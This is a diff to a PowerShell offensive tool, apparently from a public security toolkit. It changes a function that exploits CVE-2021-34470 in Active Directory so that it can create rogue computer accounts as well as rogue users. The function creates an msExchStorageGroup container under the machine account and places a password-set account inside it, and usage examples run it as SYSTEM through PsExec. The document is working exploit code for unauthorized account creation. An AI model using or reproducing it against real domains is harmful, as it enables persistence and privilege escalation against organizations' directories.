@@ -1,12 +1,12 @@
-Function New-RogueUser {
+Function New-RogueAccount {
 <#
 .SYNOPSIS
-    Create a new user in Active Directory by exploiting CVE-2021-34470.
+    Create a new account (user or computer) in Active Directory by exploiting CVE-2021-34470.
 
     Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
-    New-RogueUser creates a msExchStorageGroup object under the current computer account, and creates a further user object under it.
+    New-RogueAccount creates a msExchStorageGroup object under the current computer account, and creates a further user or computer object under it.
 
 .PARAMETER Server
     Specifies the domain controller to query.
@@ -14,17 +14,21 @@ Function New-RogueUser {
 .PARAMETER Credential
     Specifies the computer account to use.
 
+.PARAMETER Class
+    Specifies the account class to create, defaults to 'user'.
+
 .PARAMETER SamAccountName
-    Specifies the Security Account Manager (SAM) account name of the user to create.
+    Specifies the Security Account Manager (SAM) account name of the account to create.
 
 .PARAMETER Password
-    Specifies the password of the user to create.
+    Specifies the password of the account to create.
 
 .EXAMPLE
-    PS C:\> New-RogueUser -Server ADATUM.CORP -Credential ADATUM\testmachine$ -SamAccountName testuser -Password P@ssw0rd
-
     PS C:\> PsExec.exe -i -s powershell.exe
-    PS C:\> New-RogueUser -SamAccountName testuser -Password P@ssw0rd
+    PS C:\> New-RogueAccount -Class computer -SamAccountName 'testmachine$' -Password P@ssw0rd
+
+.EXAMPLE
+    PS C:\> New-RogueAccount -Server ADATUM.CORP -Credential 'ADATUM\testmachine$' -SamAccountName testuser -Password P@ssw0rd
 #>
 
     [CmdletBinding()]
@@ -37,6 +41,10 @@ Function New-RogueUser {
         [Management.Automation.PSCredential]
         [Management.Automation.Credential()]
         $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateSet('user', 'computer')]
+        [String]
+        $Class = 'user',
 
         [Parameter(Mandatory = $True)]
         [ValidateLength(0, 256)]
@@ -71,11 +79,11 @@ Function New-RogueUser {
         $newContainer = New-LdapObject -ADSpath "LDAP://$Server/$($computer.DistinguishedName)" -RDN $containerRDN -Class "msExchStorageGroup" -Properties @{nTSecurityDescriptor=$ba} -Credential $Credential
         Write-Host "[+] Container created: $($newContainer.DistinguishedName)"
 
-        $userRDN = "cn=$SamAccountName"
-        $newUser = New-LdapObject -ADSpath "LDAP://$Server/$($newContainer.DistinguishedName)" -RDN $userRDN -Class "user" -Properties @{sAMAccountName=$SamAccountName; userAccountControl=544} -Credential $Credential
-        $newUser.Invoke("SetPassword", $Password)
-        $newUser.CommitChanges()
-        Write-Host "[+] User created: $($newUser.DistinguishedName)"
+        $objectRDN = "cn=$SamAccountName"
+        $newObject = New-LdapObject -ADSpath "LDAP://$Server/$($newContainer.DistinguishedName)" -RDN $objectRDN -Class $Class -Properties @{sAMAccountName=$SamAccountName; userAccountControl=544} -Credential $Credential
+        $newObject.Invoke("SetPassword", $Password)
+        $newObject.CommitChanges()
+        Write-Host "[+] $Class created: $($newObject.DistinguishedName)"
     }
 }
 
